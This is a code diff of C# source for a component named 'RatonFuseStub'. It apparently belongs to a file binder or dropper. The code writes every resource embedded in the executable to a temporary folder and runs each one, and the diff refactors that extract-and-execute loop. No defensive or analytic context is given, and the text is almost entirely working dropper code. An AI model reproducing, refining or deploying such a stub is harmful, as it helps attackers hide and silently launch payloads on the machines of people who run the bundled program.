@@ -1,4 +1,4 @@
-﻿using System;
+using System;
 using System.Diagnostics;
 using System.IO;
 using System.Reflection;
@@ -20,32 +20,34 @@ namespace RatonFuseStub
                 Directory.CreateDirectory(tempDir);
 
                 Assembly asm = Assembly.GetExecutingAssembly();
+                string prefix = asm.GetName().Name + ".";
 
                 foreach (string res in asm.GetManifestResourceNames())
                 {
                     if (res.EndsWith(".resources"))
                         continue;
 
-                    using (Stream s = asm.GetManifestResourceStream(res))
+                    Stream s = asm.GetManifestResourceStream(res);
+                    if (s == null || s.Length == 0)
+                        continue;
+
+                    string name = res.StartsWith(prefix)
+                        ? res.Substring(prefix.Length)
+                        : res;
+
+                    string outPath = Path.Combine(tempDir, name);
+
+                    using (s)
+                    using (FileStream fs = File.Create(outPath))
                     {
-                        if (s == null || s.Length == 0)
-                            continue;
-
-                        string asmName = asm.GetName().Name + ".";
-                        string name = res.StartsWith(asmName)
-                            ? res.Substring(asmName.Length)
-                            : res;
-                        string outPath = Path.Combine(tempDir, name);
-
-                        using (FileStream fs = new FileStream(outPath, FileMode.Create, FileAccess.Write))
-                            s.CopyTo(fs);
-
-                        Process.Start(new ProcessStartInfo
-                        {
-                            FileName = outPath,
-                            UseShellExecute = true
-                        });
+                        s.CopyTo(fs);
                     }
+
+                    Process.Start(new ProcessStartInfo
+                    {
+                        FileName = outPath,
+                        UseShellExecute = true
+                    });
                 }
             }
             catch
